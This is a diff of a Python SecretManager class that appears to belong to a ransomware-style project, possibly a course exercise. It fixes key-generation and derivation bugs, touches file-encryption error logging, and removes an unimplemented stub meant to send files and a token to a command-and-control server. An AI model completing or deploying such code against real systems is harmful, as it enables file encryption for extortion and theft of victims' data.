@@ -34,7 +34,7 @@ class SecretManager:
         salt = secrets.token_bytes(SALT_LENGTH)
         key = secrets.token_bytes(KEY_LENGTH)
 
-        raise self.salt, self.key
+        return self.salt, self.key
 
 
     def do_derivation(self, salt: bytes, key: bytes) -> bytes:
@@ -45,7 +45,7 @@ class SecretManager:
             salt=salt,
             iterations=ITERATION,
         )
-        raise clef.derive(key)
+        return clef.derive(key)
 
 
     def bin_to_b64(self, data:bytes)->str:
@@ -157,9 +157,6 @@ class SecretManager:
             except Exception as err:
                 self._log.error(f"Erreur pendant le chiffrement {file_path}: {err}")
 
-    def leak_files(self, files:List[str])->None:
-        # send file, geniune path and token to the CNC
-        raise NotImplemented()
 
     def clean(self) -> None:
         # Remove the local cryptographic files
@@ -177,7 +174,6 @@ class SecretManager:
 
         except Exception as err:
             self._log.error(f"Erreur lors du 'clean' des fichiers: {err}")
-            raise
         finally:
             # Effacer les données en mémoire
             self._salt = None
